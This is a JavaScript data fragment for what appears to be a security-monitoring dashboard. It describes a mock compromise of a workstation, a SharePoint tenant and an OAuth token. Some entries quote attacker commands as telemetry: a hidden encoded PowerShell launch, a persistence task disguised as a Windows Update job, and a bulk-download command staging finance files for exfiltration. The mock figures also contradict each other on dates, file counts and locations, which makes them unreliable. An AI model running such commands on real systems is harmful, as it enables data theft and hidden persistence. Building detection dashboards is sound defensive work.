        label: 'Logon Activity', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  09:20:05', dot:'green',
            details: { 'User':'m.henderson', 'Logon Type':'Cloud Sign-In (Azure AD)', 'Source App':'Outlook Web', 'MFA':'Push notification approved', 'Result':'Success', 'Risk Level':'None', 'Location':'Austin, TX, USA' } },
          { time:'11 May 2026  10:15:22', dot:'green',
            details: { 'User':'m.henderson', 'Logon Type':'Interactive Logon', 'Source App':'Windows Logon (CORP-WS-045)', 'MFA':'N/A (domain auth)', 'Result':'Success', 'Risk Level':'None', 'Location':'Austin, TX, USA' } },
          { time:'10 May 2026  09:05:11', dot:'green',
            details: { 'User':'m.henderson', 'Logon Type':'Network Logon', 'Source App':'File Share (\\\\fs01)', 'MFA':'N/A', 'Result':'Success', 'Risk Level':'None', 'Location':'Austin, TX, USA' } }
        ],
        viewAllData: [
          { time:'11 May 2026  09:20:05', dot:'green',
            details: { 'User':'m.henderson', 'Logon Type':'Cloud Sign-In (Azure AD)', 'Source App':'Outlook Web', 'MFA':'Push notification approved', 'Result':'Success', 'Risk Level':'None', 'Location':'Austin, TX, USA' } },
          { time:'11 May 2026  10:15:22', dot:'green',
            details: { 'User':'m.henderson', 'Logon Type':'Interactive Logon', 'Source App':'Windows Logon (CORP-WS-045)', 'MFA':'N/A (domain auth)', 'Result':'Success', 'Risk Level':'None', 'Location':'Austin, TX, USA' } },
          { time:'10 May 2026  09:05:11', dot:'green',
            details: { 'User':'m.henderson', 'Logon Type':'Network Logon', 'Source App':'File Share (\\\\fs01)', 'MFA':'N/A', 'Result':'Success', 'Risk Level':'None', 'Location':'Austin, TX, USA' } },
          { time:'10 May 2026  06:55:00', dot:'green',
            details: { 'User':'m.henderson', 'Logon Type':'Interactive Logon', 'Source App':'Windows Logon (CORP-WS-045)', 'MFA':'N/A', 'Result':'Success', 'Risk Level':'None', 'Location':'Austin, TX, USA' } },
          { time:'09 May 2026  09:10:33', dot:'green',
            details: { 'User':'m.henderson', 'Logon Type':'Cloud Sign-In (Azure AD)', 'Source App':'SharePoint Online', 'MFA':'Push approved', 'Result':'Success', 'Risk Level':'None', 'Location':'Austin, TX, USA' } }
        ]
      },
      remediationGuide: {
        label: 'Recommendations & Remediation', expanded: true, noCollapse: true,
        remediationData: {
          verdict: 'Trusted — Normal Corporate VPN',
          severity: 'low',
          recommendations: [
            { icon:'✅', title:'No Immediate Action Required', desc:'This IP (10.18.1.81) is a legitimate corporate VPN endpoint assigned to m.henderson from the NY office. No anomalies detected from this source.', priority:'Info' },
            { icon:'📊', title:'Continue Monitoring', desc:'Maintain standard monitoring. The user activities from this IP are within baseline parameters (8AM-6PM EST, normal file access patterns).', priority:'Low' },
            { icon:'🔐', title:'Verify VPN Configuration', desc:'Ensure split-tunneling is disabled on corporate VPN to prevent data leakage. Confirm IPSec certificates are current.', priority:'Low' }
          ],
          playbooks: []
        }
      }
    }
  },
  'dev-ws045': {
    type: 'device', modalTitle: 'Device Details · CORP-WS-045',
    sections: {
      riskSummary: {
        label: 'Risk Summary', expanded: true, noCollapse: true,
        summaryCard: {
          riskScore: 82,
          maxScore: 100,
          severity: 'Critical',
          statusBadge: 'Compromised Host',
          metrics: [
            { icon:'⚙', label:'Suspicious Processes', value:'2', color:'#FF5900' },
            { icon:'🔧', label:'Rogue Services', value:'1', color:'#DD1616' },
            { icon:'🌐', label:'Tor Connections', value:'2 outbound', color:'#DD1616' }
          ],
          firstSeen: '2024-03-15',
          lastActivity: '11 May 2026 10:37:01'
        }
      },
      deviceDetails: {
        label: 'Device Details', expanded: true,
        kv: {
          'Hostname':'CORP-WS-045',
          'OS':'Windows 11 Pro 23H2 (Build 22631.3737)',
          'Domain':'contoso.local',
          'OU':'OU=Workstations,DC=contoso,DC=local',
          'Assigned User':'m.henderson',
          'Last Seen':'11 May 2026  10:37:01',
          'Disk Encryption':'BitLocker — Enabled (XTS-AES 256)'
        }
      },
      agentStatus: {
        label: 'Agent Status & Health', expanded: false,
        kv: {
          'Agent Status':'🟢 Running',
          'Collector ID':'LC-NYC-045',
          'Last Sync':'11 May 2026  10:35:00 (2 min ago)',
          'Agent Version':'6.2.1',
          'Log Collection':'Active — Windows Security, Sysmon, PowerShell'
        }
      },
      gpoApplied: {
        label: 'GPO Applied to Device', expanded: false, viewAll: true,
        timeline: [
          { time:'Default Domain Policy', dot:'green',
            details: { 'GPO Name':'Default Domain Policy', 'Status':'Enabled', 'Last Changed':'2025-01-15', 'Type':'Computer Configuration', 'Scope':'Domain-wide' } },
          { time:'WS-Security-Baseline', dot:'green',
            details: { 'GPO Name':'WS-Security-Baseline', 'Status':'Enabled', 'Last Changed':'2025-05-20', 'Type':'Computer Configuration', 'Scope':'OU=Workstations', 'Note':'Audit policies, firewall rules, AppLocker' } },
          { time:'WS-BitLocker-Enforce', dot:'green',
            details: { 'GPO Name':'WS-BitLocker-Enforce', 'Status':'Enabled', 'Last Changed':'2024-11-10', 'Type':'Computer Configuration', 'Scope':'OU=Workstations' } }
        ]
      },
      securityEventSummary: {
        label: 'Security Event Summary (24h)', expanded: false,
        secEventGroups: [
          { groupLabel:'Needs Review', groupColor:'#DD1616', items: [
            { label:'Failed Logons', eventId:'4625', count:14, flagged:true },
            { label:'Service Installs', eventId:'7045', count:1, flagged:true },
            { label:'Scheduled Tasks', eventId:'4698', count:1, flagged:true }
          ]},
          { groupLabel:'Normal', groupColor:'#20A144', items: [
            { label:'Process Creation', eventId:'4688', count:312 },
            { label:'Object Access', eventId:'4663', count:247 },
            { label:'Privilege Use', eventId:'4672', count:8 },
            { label:'Policy Changes', eventId:'4719', count:0 }
          ]}
        ]
      },
      usbDeviceEvents: {
        label: 'USB Device Events', expanded: false, viewAll: true,
        timeline: [
          { time:'10 May 2026  16:45:00', dot:'green',
            details: { 'Event':'USB Plugged In', 'Device':'SanDisk Ultra USB 3.0 (128GB)', 'Class':'Mass Storage', 'User':'m.henderson', 'Event ID':'6416' } },
          { time:'10 May 2026  17:10:22', dot:'green',
            details: { 'Event':'USB Plugged Out', 'Device':'SanDisk Ultra USB 3.0 (128GB)', 'Class':'Mass Storage', 'User':'m.henderson', 'Event ID':'6416' } }
        ]
      },
      scheduledTasks: {
        label: 'Scheduled Task Events', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:36:55', dot:'red', malicious: true,
            details: { 'Event':'Task Created (4698)', 'Task Name':'\\Microsoft\\Windows\\UpdateCheck', 'User':'NT AUTHORITY\\SYSTEM', 'Command':'C:\\Windows\\Temp\\wuhelper.exe -persist', 'Trigger':'At system startup', 'Note':'Persistence mechanism — masquerading as Windows Update task' } },
          { time:'09 May 2026  06:00:00', dot:'green',
            details: { 'Event':'Task Enabled (4700)', 'Task Name':'\\Microsoft\\Windows\\Defrag\\ScheduledDefrag', 'User':'SYSTEM', 'Command':'defrag.exe', 'Trigger':'Weekly', 'Note':'Legitimate scheduled defragmentation' } }
        ]
      },
      loginActivity: {
        label: 'Login Activity', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:36:22', dot:'red', malicious: true,
            details: { 'User':'m.henderson', 'Logon Type':'Interactive', 'Source IP':'192.168.1.22', 'Target':'CORP-WS-045', 'Status':'Success', 'MFA':'N/A', 'Risk':'Critical — Post-compromise session' } },
          { time:'11 May 2026  09:20:05', dot:'green',
            details: { 'User':'m.henderson', 'Logon Type':'Interactive', 'Source IP':'10.18.1.81', 'Target':'CORP-WS-045', 'Status':'Success', 'MFA':'N/A (domain auth)', 'Risk':'None' } },
          { time:'11 May 2026  06:30:22', dot:'green',
            details: { 'User':'admin', 'Logon Type':'Remote Interactive (RDP)', 'Source IP':'10.0.0.5', 'Target':'CORP-WS-045', 'Status':'Success', 'MFA':'N/A', 'Risk':'None' } }
        ],
        viewAllData: [
          { time:'11 May 2026  10:36:22', dot:'red', malicious: true,
            details: { 'User':'m.henderson', 'Logon Type':'Interactive', 'Source IP':'192.168.1.22', 'Target':'CORP-WS-045', 'Status':'Success', 'MFA':'N/A', 'Risk':'Critical — Post-compromise session' } },
          { time:'11 May 2026  09:20:05', dot:'green',
            details: { 'User':'m.henderson', 'Logon Type':'Interactive', 'Source IP':'10.18.1.81', 'Target':'CORP-WS-045', 'Status':'Success', 'MFA':'N/A (domain auth)', 'Risk':'None' } },
          { time:'11 May 2026  06:30:22', dot:'green',
            details: { 'User':'admin', 'Logon Type':'Remote Interactive (RDP)', 'Source IP':'10.0.0.5', 'Target':'CORP-WS-045', 'Status':'Success', 'MFA':'N/A', 'Risk':'None' } },
          { time:'11 May 2026  07:55:00', dot:'orange',
            details: { 'User':'unknown', 'Logon Type':'Network', 'Source IP':'10.112.11.1', 'Target':'CORP-WS-045', 'Status':'Failure — Invalid credentials', 'MFA':'N/A', 'Risk':'Medium' } },
          { time:'10 May 2026  17:45:00', dot:'green',
            details: { 'User':'m.henderson', 'Logon Type':'Network', 'Source IP':'10.18.1.81', 'Target':'CORP-WS-045 → \\\\fs01', 'Status':'Success', 'MFA':'N/A', 'Risk':'None' } },
          { time:'10 May 2026  09:10:00', dot:'green',
            details: { 'User':'m.henderson', 'Logon Type':'Interactive', 'Source IP':'10.18.1.81', 'Target':'CORP-WS-045', 'Status':'Success', 'MFA':'N/A', 'Risk':'None' } },
          { time:'09 May 2026  21:15:00', dot:'orange',
            details: { 'User':'admin', 'Logon Type':'Remote Interactive (RDP)', 'Source IP':'10.0.0.5', 'Target':'CORP-WS-045', 'Status':'Success', 'MFA':'N/A', 'Risk':'Medium — Off-hours login' } }
        ]
      },
      processesOnHost: {
        label: 'Processes Running on Host', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:36:22', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'proc-powershell', label:'powershell.exe', icon:'⚙', sourceEntity:'dev-ws045' },
            details: { 'Process':'powershell.exe', 'PID':'4892', 'User':'m.henderson', 'Command':'-nop -w hidden -encodedcommand ...', 'Status':'Running' },
            action: { label:'⊘ Kill Process', type:'outline', toast:'Killing process powershell.exe…' } },
          { time:'11 May 2026  10:36:25', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-winupdatesvc', label:'wuhelper.exe', icon:'⚙', sourceEntity:'dev-ws045' },
            details: { 'Process':'wuhelper.exe', 'PID':'5501', 'User':'SYSTEM', 'Command':'C:\\Windows\\Temp\\wuhelper.exe', 'Status':'Running' },
            action: { label:'⊘ Kill Process', type:'outline', toast:'Killing process wuhelper.exe…' } },
          { time:'11 May 2026  10:15:05', dot:'green',
            viewOnGraph: { nodeId:'proc-explorer', label:'explorer.exe', icon:'⚙', sourceEntity:'dev-ws045' },
            details: { 'Process':'explorer.exe', 'PID':'1204', 'User':'m.henderson', 'Command':'C:\\Windows\\explorer.exe', 'Status':'Running' } },
          { time:'11 May 2026  10:15:02', dot:'green',
            viewOnGraph: { nodeId:'proc-defender', label:'MsMpEng.exe', icon:'⚙', sourceEntity:'dev-ws045' },
            details: { 'Process':'MsMpEng.exe', 'PID':'824', 'User':'SYSTEM', 'Command':'Defender Antimalware Service', 'Status':'Running' } }
        ]
      },
      servicesOnHost: {
        label: 'Services Created on Host', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:35:50', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-winupdatesvc', label:'WinUpdateSvc', icon:'⚙', sourceEntity:'dev-ws045' },
            details: { 'Service':'WinUpdateSvc', 'Display Name':'Windows Update Helper Service', 'Account':'SYSTEM', 'Binary':'C:\\Windows\\Temp\\wuhelper.exe', 'Signed':'No ⚠', 'Status':'Running' },
            action: { label:'⊘ Stop Service', type:'outline', toast:'Stopping WinUpdateSvc service…' } },
          { time:'11 May 2026  06:12:30', dot:'green',
            viewOnGraph: { nodeId:'svc-wuauserv', label:'wuauserv', icon:'⚙', sourceEntity:'dev-ws045' },
            details: { 'Service':'wuauserv', 'Display Name':'Windows Update (Legitimate)', 'Account':'SYSTEM', 'Binary':'C:\\Windows\\System32\\svchost.exe', 'Signed':'Yes', 'Status':'Running' } },
          { time:'11 May 2026  06:12:30', dot:'green',
            viewOnGraph: { nodeId:'svc-windefend', label:'WinDefend', icon:'⚙', sourceEntity:'dev-ws045' },
            details: { 'Service':'WinDefend', 'Display Name':'Microsoft Defender Antivirus', 'Account':'SYSTEM', 'Binary':'C:\\ProgramData\\Microsoft\\...\\MsMpEng.exe', 'Signed':'Yes', 'Status':'Running' } }
        ]
      },
      usersLoggedOn: {
        label: 'User Accounts Logged On', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:15:00', dot:'green',
            details: { 'User':'m.henderson', 'Logon Type':'Interactive (Console)', 'Source':'Keyboard', 'Session':'Active', 'Duration':'5h 22m' } },
          { time:'11 May 2026  06:30:22', dot:'green',
            details: { 'User':'admin', 'Logon Type':'Remote Interactive (RDP)', 'Source':'10.0.0.5 (Admin-WS)', 'Session':'Disconnected', 'Duration':'45m' } },
          { time:'30 Mar 2026  06:12:30', dot:'green',
            details: { 'User':'NT AUTHORITY\\SYSTEM', 'Logon Type':'Service', 'Source':'Local', 'Session':'Background', 'Duration':'4d 6h' } }
        ]
      },
      recentAlerts: {
        label: 'Recent Alerts', expanded: true, viewAll: true,
        timeline: [
          { time:'11 May 2026  09:38:22', dot:'red',
            viewOnGraph: { nodeId:'alert-arp-spoofing-1', label:'LAN ARP Spoofing', icon:'🔔', sourceEntity:'dev-ws045' },
            alertProfileId: 'alert-arp-spoofing-1',
            detailsGrid: [
              { label:'09:38:22 LAN ARP Spoofing — MITM', value:'Network Attack', tag:'Type', tagVal:'CORRELATION', mitre:'T1557.002 (ARP Cache Poisoning)', source:'CORP-WS-045', status:'Open', severity:'Critical' }
            ] },
          { time:'11 May 2026  10:36:22', dot:'red',
            viewOnGraph: { nodeId:'alert-sus-service', label:'Suspicious Service', icon:'🔔', sourceEntity:'dev-ws045' },
            alertProfileId: 'alert-sus-service',
            detailsGrid: [
              { label:'10:36:22 Suspicious Service Installed', value:'Persistence', tag:'Type', tagVal:'EDR', mitre:'T1543.003 (Create/Modify System Process)', source:'CORP-WS-045', status:'Open', severity:'High' }
            ] },
          { time:'11 May 2026  10:37:01', dot:'red',
            viewOnGraph: { nodeId:'alert-enc-powershell', label:'Encoded PowerShell', icon:'🔔', sourceEntity:'dev-ws045' },
            alertProfileId: 'alert-enc-powershell',
            detailsGrid: [
              { label:'10:37:01 Encoded PowerShell Execution', value:'Execution', tag:'Type', tagVal:'EDR', mitre:'T1059.001 (PowerShell)', source:'CORP-WS-045', status:'Open', severity:'Critical' }
            ] }
        ]
      },
      remediationGuide: {
        label: 'Recommendations & Remediation', expanded: true, noCollapse: true,
        remediationData: {
          verdict: 'Malicious — Compromised Endpoint',
          severity: 'critical',
          recommendations: [
            { icon:'�', title:'Determine Initial Access Vector', desc:'Was CORP-WS-045 the initial entry point or was it compromised via lateral movement from m.henderson\'s session? Check the timeline — when did the first malicious activity start?', priority:'Critical' },
            { icon:'🧩', title:'Assess Forensic Evidence Needs', desc:'Determine if memory dump and disk image are needed for legal/insurance purposes before remediation destroys evidence. Check incident response SLA requirements.', priority:'Critical' },
            { icon:'📊', title:'Evaluate Rootkit Indicators', desc:'Check for kernel-level hooks, hidden processes, or bootkit artifacts. If rootkit is present, reimaging is the only safe option — patching alone won\'t suffice.', priority:'High' },
            { icon:'📝', title:'Assess Lateral Movement from This Device', desc:'ARP spoofing from CORP-WS-045 may have captured credentials from neighboring workstations on VLAN 10. Evaluate which hosts were active during the spoofing window.', priority:'High' },
            { icon:'🔍', title:'Review Patch Status as Entry Vector', desc:'3 critical patches pending including CVE-2026-0178 (RDP, CVSS 7.8). Determine if the unpatched RDP vulnerability was the initial access method.', priority:'High' }
          ],
          playbooks: [
            { name:'Endpoint Isolation & Forensics', id:'PB-ENDPT-001', desc:'Network isolate → Memory capture → Disk image → Preserve chain of custody → Upload to forensics server', status:'Ready', estimatedTime:'3 min', urgency:'Run Immediate' },
            { name:'Malware Removal & Hardening', id:'PB-MALREM-002', desc:'Kill C2 process → Delete malicious binaries → Clean registry → Apply patches → Re-scan → Verify clean', status:'Ready', estimatedTime:'15 min', urgency:'Run Immediate' },
            { name:'VLAN-Wide IOC Sweep', id:'PB-SWEEP-003', desc:'Deploy IOC scanner to 192.168.1.0/24 → Check for ARP cache poisoning → Scan for lateral movement artifacts', status:'Ready', estimatedTime:'20 min', urgency:'High Priority' }
          ]
        }
      }
    }
  },
  'svc-sharepoint': {
    type: 'service', modalTitle: 'Service Details · SharePoint Online',
    sections: {
      riskSummary: {
        label: 'Risk Summary', expanded: true, noCollapse: true,
        summaryCard: {
          riskScore: 85,
          maxScore: 100,
          severity: 'Critical',
          statusBadge: 'Data Exfiltration Detected',
          metrics: [
            { icon:'📁', label:'Files Exfiltrated', value:'24', color:'#DD1616' },
            { icon:'⏱', label:'Exfil Duration', value:'3 min', color:'#DD1616' },
            { icon:'📊', label:'Sensitive Files', value:'8 (Confidential)', color:'#FF5900' },
            { icon:'🔗', label:'Anomalous Sessions', value:'2', color:'#FF5900' },
            { icon:'🌐', label:'External Shares', value:'0', color:'#198019' },
            { icon:'⚠', label:'DLP Violations', value:'3', color:'#DD1616' }
          ],
          firstSeen: '2024-01-10',
          lastActivity: '11 May 2026 10:35:00'
        }
      },
      serviceDetails: {
        label: 'Service Details', expanded: true,
        kv: {
          'Service':'SharePoint Online',
          'Category':'Collaboration & File Sharing',
          'Provider':'Microsoft 365',
          'Tenant':'contoso.sharepoint.com',
          'Status':'Active',
          'DLP Policies':'3 active (1 in audit-only)',
          'Sensitivity Labels':'Enabled',
          'External Sharing':'Restricted to approved domains'
        }
      },
      fileAccessAnomaly: {
        label: 'File Access Anomaly', expanded: true, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:34:00 – 10:38:00', dot:'red', malicious: true,
            details: {
              'User':'m.henderson',
              'Action':'Bulk Download',
              'Files Accessed':'142 files in 4 minutes',
              'Normal Baseline':'8 files/day (peer avg)',
              'Deviation':'17.75× above normal',
              'Sites':'Finance-Reports, HR-Confidential, Project-Atlas',
              'Sensitive Files':'3 flagged (Confidential label)',
              'File Types':'.xlsx (84), .pdf (32), .docx (18), .pptx (8)',
              'Total Size':'2.3 GB'
            } }
        ]
      },
      sensitiveFiles: {
        label: 'Sensitive Files Accessed', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:34:12', dot:'red', malicious: true,
            details: { 'File':'Q4-2025-Revenue-Projections.xlsx', 'Site':'Finance-Reports', 'Label':'Confidential — Finance', 'Action':'Downloaded' } },
          { time:'11 May 2026  10:35:08', dot:'red', malicious: true,
            details: { 'File':'Employee-Compensation-2026.xlsx', 'Site':'HR-Confidential', 'Label':'Highly Confidential — HR', 'Action':'Downloaded' } },
          { time:'11 May 2026  10:36:44', dot:'orange',
            details: { 'File':'Project-Atlas-Architecture.pdf', 'Site':'Project-Atlas', 'Label':'Internal Only', 'Action':'Downloaded' } }
        ]
      },
      dlpPolicies: {
        label: 'DLP Policy Status', expanded: false,
        kv: {
          'Block External Sharing of Confidential':'Active — Triggered 2× ⚠',
          'Warn on PII Download':'Audit Only ⚠ (not blocking)',
          'Require Justification > 50 Files':'Not Configured ⚠',
          'Block USB Copy of Labeled Files':'Active'
        }
      },
      processes: {
        label: 'Related Processes', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  09:33:15', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-oauth', label:'OAuth Token (FileSync Pro)', icon:'⚙', sourceEntity:'svc-sharepoint' },
            details: { 'Process Name':'OAuth Token (FileSync Pro)', 'Type':'Bearer Token', 'Action':'Files.ReadWrite.All — used to bulk download', 'Files Accessed':'142', 'Data Volume':'2.3 GB' } },
          { time:'11 May 2026  10:34:00', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'proc-powershell', label:'powershell.exe', icon:'⚙', sourceEntity:'svc-sharepoint' },
            details: { 'Process Name':'powershell.exe', 'Context':'PnP.PowerShell module used for bulk file operations', 'User':'m.henderson', 'Command':'Get-PnPFile -Url /Finance/* -Path C:\\Temp\\exfil', 'Status':'Completed' } }
        ]
      },
      serviceTriggered: {
        label: 'Related Services', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  09:32:10', dot:'green',
            viewOnGraph: { nodeId:'svc-azure-ad', label:'Azure AD Portal', icon:'🔧', sourceEntity:'svc-sharepoint' },
            details: { 'Service Name':'Azure AD Portal', 'Relationship':'Authentication provider for SharePoint SSO', 'Status':'Active' } },
          { time:'11 May 2026  10:35:50', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-winupdatesvc', label:'WinUpdateSvc', icon:'🔧', sourceEntity:'svc-sharepoint' },
            details: { 'Service Name':'WinUpdateSvc', 'Relationship':'Exfiltrated data staged via this service\'s C2 channel', 'Host':'CORP-WS-045', 'Status':'Running — Stop recommended' } }
        ]
      },
      recentAlerts: {
        label: 'Recent Alerts', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:34:30', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'alert-bulk-download', label:'Bulk File Download', icon:'🔔', sourceEntity:'svc-sharepoint' },
            alertProfileId: 'alert-bulk-download',
            detailsGrid: [
              { label:'10:34:30 Bulk File Download Detected', value:'142 files in 4 min', tag:'Type', tagVal:'DLP', mitre:'T1530 (Data from Cloud Storage)', source:'SharePoint Online', status:'Open', severity:'Critical' }
            ] },
          { time:'11 May 2026  10:35:00', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'alert-sensitive-access', label:'Sensitive File Access', icon:'🔔', sourceEntity:'svc-sharepoint' },
            alertProfileId: 'alert-sensitive-access',
            detailsGrid: [
              { label:'10:35:00 Confidential File Accessed', value:'HR + Finance data', tag:'Type', tagVal:'DLP', mitre:'T1213.002 (Sharepoint)', source:'SharePoint Online', status:'Open', severity:'High' }
            ] },
          { time:'11 May 2026  10:38:30', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'alert-data-exfil', label:'Data Exfiltration', icon:'🔔', sourceEntity:'svc-sharepoint' },
            alertProfileId: 'alert-data-exfil',
            detailsGrid: [
              { label:'10:38:30 Potential Data Exfiltration', value:'2.3 GB transferred', tag:'Type', tagVal:'DLP', mitre:'T1041 (Exfiltration Over C2 Channel)', source:'SharePoint Online', status:'Open', severity:'Critical' }
            ] }
        ]
      },
      remediationGuide: {
        label: 'Recommendations & Remediation', expanded: true, noCollapse: true,
        remediationData: {
          verdict: 'Compromised — Data Exfiltration Target',
          severity: 'critical',
          recommendations: [
            { icon:'�', title:'Classify All 24 Exfiltrated Files', desc:'Map files by sensitivity: 8 Confidential, 4 Highly Confidential, 12 Internal Only. Determine PII/PHI/PCI data exposure scope and which regulatory frameworks apply.', priority:'Critical' },
            { icon:'📝', title:'Assess Breach Notification Requirements', desc:'EU employee data (Employee_Salary_Data.csv) triggers GDPR Art.33 (72h). Financial data may trigger SEC disclosure. Engage Legal, DPO, and Compliance teams.', priority:'Critical' },
            { icon:'🔍', title:'Determine File Integrity', desc:'Check if files were only read/downloaded or also modified/deleted. Review SharePoint versioning and recycle bin for evidence of data tampering during the attack window.', priority:'High' },
            { icon:'🧩', title:'Evaluate Sharing Link Exposure', desc:'Check if any external sharing links were created during the compromise that could provide ongoing data access even after user revocation.', priority:'High' },
            { icon:'🔍', title:'Review DLP Policy Effectiveness', desc:'DLP policies on /Finance/Sensitive and /HR/Restricted were Alert-only. Assess whether upgrading to Block action would have prevented the exfiltration without impacting legitimate workflows.', priority:'Medium' }
          ],
          playbooks: [
            { name:'SharePoint Access Revocation', id:'PB-SP-001', desc:'Revoke user permissions → Disable external sharing → Review sharing links → Regenerate access tokens', status:'Ready', estimatedTime:'2 min', urgency:'Run Immediate' },
            { name:'Data Exposure Assessment', id:'PB-DLP-002', desc:'Enumerate accessed files → Classify by sensitivity → Calculate regulatory impact → Generate breach report', status:'Ready', estimatedTime:'10 min', urgency:'High Priority' },
            { name:'SharePoint Security Hardening', id:'PB-SPHARD-003', desc:'Enable conditional access → Restrict download to managed devices → Enable sensitivity labels → Configure alerts', status:'Ready', estimatedTime:'8 min', urgency:'Standard' }
          ]
        }
      }
    }
  },
  'svc-oauth': {
    type: 'service', modalTitle: 'Service Details · OAuth Token',
    sections: {
      riskSummary: {
        label: 'Risk Summary', expanded: true, noCollapse: true,
        summaryCard: {
          riskScore: 72,
          maxScore: 100,
          severity: 'High',
          statusBadge: 'Suspicious Token Activity',
          metrics: [
            { icon:'🔑', label:'Active Tokens', value:'3', color:'#FF5900' },
            { icon:'⚠', label:'Unregistered App', value:'FileSync Pro', color:'#DD1616' },
            { icon:'📋', label:'Excessive Scopes', value:'Mail + Files', color:'#FF5900' },
            { icon:'⏱', label:'Token Age', value:'Post-compromise', color:'#DD1616' },
            { icon:'🔐', label:'Consent Type', value:'User (no admin)', color:'#D14900' },
            { icon:'🛡', label:'Publisher Verified', value:'No ✗', color:'#DD1616' }
          ],
          firstSeen: '11 May 2026 09:35:00',
          lastActivity: '11 May 2026 10:36:22'
        }
      },
      processDetails: {
        label: 'Token Details', expanded: true,
        kv: {
          'Token Type':'OAuth 2.0 Bearer Token',
          'Grant Type':'Authorization Code',
          'Client App':'FileSync Pro (App ID: 7a3b8c4d-...)',
          'Scope':'Mail.Read, Mail.ReadWrite, Files.ReadWrite.All, User.Read',
          'Issued':'2025-06-04 09:33 UTC',
          'Expires':'2025-06-04 10:33 UTC (1h lifetime)',
          'Refresh Token':'Active (14-day sliding window)',
          'Issuer':'https://login.microsoftonline.com',
          'Audience':'https://graph.microsoft.com',
          'IP at Issuance':'185.220.101.42 (Tor) ⚠',
          'MFA Claim':'amr: [pwd, mfa] — token replay suspected'
        }
      },
      tokenAnomaly: {
        label: 'Token Anomalies', expanded: true, viewAll: true,
        timeline: [
          { time:'Critical', dot:'red', malicious: true,
            details: {
              'Anomaly':'Broad Scope from Untrusted Location',
              'Detail':'Files.ReadWrite.All + Mail.ReadWrite granted from Tor exit node',
              'Baseline':'User normally uses only Mail.Read from corporate IP',
              'Risk':'Token can read/write all files and email'
            } },
          { time:'High', dot:'red',
            details: {
              'Anomaly':'Suspicious App Consent',
              'Detail':'FileSync Pro — not in approved app catalog',
              'Publisher':'Unverified publisher',
              'First Seen':'2025-06-04 (today)',
              'Admin Consent':'No — user self-consented'
            } },
          { time:'Medium', dot:'orange',
            details: {
              'Anomaly':'Token Replay Indicators',
              'Detail':'Same token used from 2 IPs within 3 minutes',
              'IP 1':'10.18.1.81 (NYC Office)',
              'IP 2':'185.220.101.42 (Bucharest, Tor)',
              'Time Gap':'7 minutes — physically impossible'
            } }
        ]
      },
      tokenUsage: {
        label: 'Token Usage (Graph API Calls)', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  09:34:12', dot:'red', malicious: true,
            details: { 'API Call':'GET /me/drive/root/children', 'Purpose':'List all OneDrive files', 'Response':'200 OK (1,247 items)' } },
          { time:'11 May 2026  09:35:01', dot:'red', malicious: true,
            details: { 'API Call':'GET /me/messages?$top=500', 'Purpose':'Read email messages', 'Response':'200 OK (500 messages)', 'Data Volume':'12.4 MB' } },
          { time:'11 May 2026  09:36:30', dot:'red', malicious: true,
            details: { 'API Call':'POST /me/drive/items/{id}/content', 'Purpose':'Download file', 'Response':'200 OK', 'File':'Q4-Revenue-Projections.xlsx' } }
        ]
      },
      serviceTriggered: {
        label: 'Related Services', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  09:34:00', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-sharepoint', label:'SharePoint Online', icon:'🔧', sourceEntity:'svc-oauth' },
            details: { 'Service Name':'SharePoint Online', 'Relationship':'Token used for Files.ReadWrite.All — 142 files downloaded', 'Action':'Bulk file download via Graph API', 'Status':'Active — Access revoked' } },
          { time:'11 May 2026  09:33:15', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-azure-ad', label:'Azure AD Portal', icon:'🔧', sourceEntity:'svc-oauth' },
            details: { 'Service Name':'Azure AD Portal', 'Relationship':'Token issued via Azure AD consent flow', 'App':'FileSync Pro (unregistered)', 'Status':'Active — Token revocation recommended' } }
        ]
      },
      processes: {
        label: 'Related Processes', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:36:22', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'proc-powershell', label:'powershell.exe', icon:'⚙', sourceEntity:'svc-oauth' },
            details: { 'Process Name':'powershell.exe', 'Relationship':'Used token scope to execute file operations', 'PID':'4892', 'User':'m.henderson', 'Status':'Running — Kill recommended' } }
        ]
      },
      recentAlerts: {
        label: 'Recent Alerts', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  09:33:15', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'alert-oauth-token', label:'Suspicious OAuth Token', icon:'🔔', sourceEntity:'svc-oauth' },
            alertProfileId: 'alert-oauth-token',
            detailsGrid: [
              { label:'09:33:15 Suspicious OAuth Token', value:'Broad Scope', tag:'Type', tagVal:'Cloud Security', mitre:'T1550.001 (Application Access Token)', source:'Azure AD', status:'Open', severity:'High' }
            ] },
          { time:'11 May 2026  09:35:00', dot:'orange',
            viewOnGraph: { nodeId:'alert-app-consent', label:'New App Consent', icon:'🔔', sourceEntity:'svc-oauth' },
            alertProfileId: 'alert-app-consent',
            detailsGrid: [
              { label:'09:35:00 New App Consent — FileSync Pro', value:'Unregistered App', tag:'Type', tagVal:'App Governance', mitre:'T1098.003 (Additional Cloud Roles)', source:'Azure AD', status:'Open', severity:'Medium' }
            ] }
        ]
      },
      remediationGuide: {
        label: 'Recommendations & Remediation', expanded: true, noCollapse: true,
        remediationData: {
